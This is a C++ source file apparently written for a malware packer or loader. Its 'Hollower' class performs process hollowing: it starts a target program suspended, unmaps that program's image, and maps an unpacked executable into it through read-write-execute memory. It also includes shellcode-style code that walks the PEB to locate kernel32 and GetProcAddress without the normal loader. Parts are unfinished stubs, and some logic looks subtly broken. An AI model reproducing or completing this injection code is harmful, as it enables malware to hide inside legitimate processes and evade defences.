#include "stdafx.h"
#include "Hollower.h"


typedef struct _PEB_LDR_DATA {
	BYTE Reserved1[8];
	PVOID Reserved2[3];
	LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
	PVOID Reserved3[2];
	UNICODE_STRING FullDllName;
	BYTE Reserved4[8];
	PVOID Reserved5[3];
#pragma warning(push)
#pragma warning(disable: 4201) // we'll always use the Microsoft compiler
	union {
		ULONG CheckSum;
		PVOID Reserved6;
	} DUMMYUNIONNAME;
#pragma warning(pop)
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE Reserved1[16];
	PVOID Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
	BYTE Reserved1[2];
	BYTE BeingDebugged;
	BYTE Reserved2[1];
	PVOID Reserved3[2];
	PPEB_LDR_DATA Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID Reserved4[3];
	PVOID AtlThunkSListPtr;
	PVOID Reserved5;
	ULONG Reserved6;
	PVOID Reserved7;
	ULONG Reserved8;
	ULONG AtlThunkSListPtr32;
	PVOID Reserved9[45];
	BYTE Reserved10[96];
	DWORD* PostProcessInitRoutine;
	BYTE Reserved11[128];
	PVOID Reserved12[1];
	ULONG SessionId;
} PEB, *PPEB;

Hollower::Hollower(std::wstring targetProcPath, IMAGE_DOS_HEADER *unpackedExe)
{
	this->path = targetProcPath;
	this->peData = new PEData(unpackedExe);

	HMODULE hmNtdll = GetModuleHandle(L"ntdll");

	this->NtUnmapViewOfSection = (TNtUnmapViewOfSection) GetProcAddress(hmNtdll, "NtUnmapViewOfSection");
	this->NtMapViewOfSection = (TNtMapViewOfSection)GetProcAddress(hmNtdll, "NtMapViewOfSection");
	this->NtCreateSection = (TNtCreateSection)GetProcAddress(hmNtdll, "NtCreateSection");
}

void Hollower::ReMapExe()
{
	//remote base addr should be same as local base addr since we are hollowing same process
	this->NtUnmapViewOfSection(this->hProc, GetModuleHandle(NULL));
	HANDLE hSection;
	LARGE_INTEGER sMaxSize = {0, 0};
	sMaxSize.LowPart = this->peData->GetOptionalHeader()->SizeOfImage;
	NTSTATUS status = this->NtCreateSection(&hSection, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &sMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
		
	void *addr = this->peData->GetModuleBase();
	void* loadedExeSection = NULL;
	DWORD vSize=0;
	status = this->NtMapViewOfSection(hSection,(HANDLE)0xffffffff, &this->loadedExeSection, NULL, NULL, NULL, &vSize, 2, NULL, PAGE_EXECUTE_READWRITE);
	status = this->NtMapViewOfSection(hSection, this->hProc, &this->remoteBase, NULL, NULL, NULL, &vSize, 2, NULL, PAGE_EXECUTE_READWRITE);
	
	std::vector<SectionInfo> sections = this->peData->GetSections();

	for (std::vector<SectionInfo>::iterator it = sections.begin(); it != sections.end(); ++it)
	{
		memcpy((void*)((int)this->loadedExeSection +(int)it->_vOffset), (void*)((int)addr +it->_rOffset), it->_vSize);
	}

}

void Hollower::ExtractPEData(IMAGE_DOS_HEADER* exe)
{

}

__declspec(naked) void BootStrap(){
	__asm {
		pusha
		//call IATshellcodeAddr
		popa
		//jump EP
	}
}

bool ContainString(char* src, char* str,int strLen,bool isUnicode)
{
	int i = 0,k=0,len=0;

	while ((src[i] != NULL && !isUnicode) || ((src[i] != NULL || src[i+1]!=NULL) && isUnicode))
	{
		while (src[i] == str[k])
		{
			if (k == strLen)
				return true;
			i+=1+isUnicode;
			k+= 1;
		}
		i+=1+ isUnicode;
		k = 0;
		len = 0;
	}
	return false;
}

void IATshellcode()
{
	_PEB *PEB;
	__asm {
		push edi;
		push fs : [0x30];
		pop edi;
		mov PEB, edi;
		pop edi;
	}

	LIST_ENTRY *leHead = &PEB->Ldr->InMemoryOrderModuleList;
	LIST_ENTRY *leNode = leHead;
	PLDR_DATA_TABLE_ENTRY dataEntry;
	void* kernel32Base;
	while(leNode->Flink != leHead){
		leNode = leNode->Flink;
		dataEntry = (PLDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(leNode, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		if (ContainString((char*)dataEntry->FullDllName.Buffer,"KERNEL32.DLL",10,true))
		{
			kernel32Base = dataEntry->DllBase;
			break;
		}
	}
	IMAGE_DOS_HEADER* kernel32Image = (IMAGE_DOS_HEADER*)kernel32Base;
	IMAGE_NT_HEADERS *kernel32NtHeader = (IMAGE_NT_HEADERS*)((int)kernel32Image + (kernel32Image)->e_lfanew);
	IMAGE_OPTIONAL_HEADER *kernel32OptionalHeader = (IMAGE_OPTIONAL_HEADER*)&kernel32NtHeader->OptionalHeader;

	IMAGE_EXPORT_DIRECTORY *kernel32Exports = (IMAGE_EXPORT_DIRECTORY*)((int)kernel32Base + kernel32OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	DWORD *functionsNames = (DWORD*)((int)kernel32Base + kernel32Exports->AddressOfNames);
	int funcIndex = 0;
	while (functionsNames != NULL)
	{
		
		if (ContainString((char*)((int)kernel32Base + *functionsNames), "GetProcAddress", 12, false))
		{
			break;
		}
		functionsNames++;
		funcIndex++;
	}
	
	DWORD *functions = (DWORD*)((int)kernel32Base + kernel32Exports->AddressOfFunctions);
	DWORD (*TGetProcAddress)(DWORD base,char* funcName) = (DWORD(*)(DWORD, char*))functions[funcIndex];


	if (kernel32Base == NULL)
		return;


}

HANDLE Hollower::DoHollow()
{
	//Create Suspended process, sets hProc member with HANDLE result
	CreateSuspendedProcess();

	ReMapExe();
	IATshellcode();
	return this->hProc;
}

void Hollower::RebuildIAT()
{
	void* iatAddr = (void*)((int)this->loadedExeSection+(int)this->peData->GetIAT().offset);
	void* entryPoint = (void*)((int)this->remoteBase + (int)(this->peData->GetOptionalHeader()->AddressOfEntryPoint));
	std::vector<Thunk> thunks = this->peData->GetIAT().thunks;
	std::string libName;
	for (std::vector<Thunk>::iterator T_it = thunks.begin(); T_it != thunks.end(); ++T_it)
	{
		libName = T_it->libname;

		for (std::vector<std::string>::iterator it = T_it->functionNames.begin(); it != T_it->functionNames.end(); ++it)
		{

		}
	}
}



void Hollower::CreateSuspendedProcess()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	memset(&si, 0, sizeof(si));

	si.cb = sizeof(STARTUPINFO);

	CreateProcess(path.c_str(), NULL, NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	
	this->hProc = pi.hProcess;
}

Hollower::~Hollower()
{

}

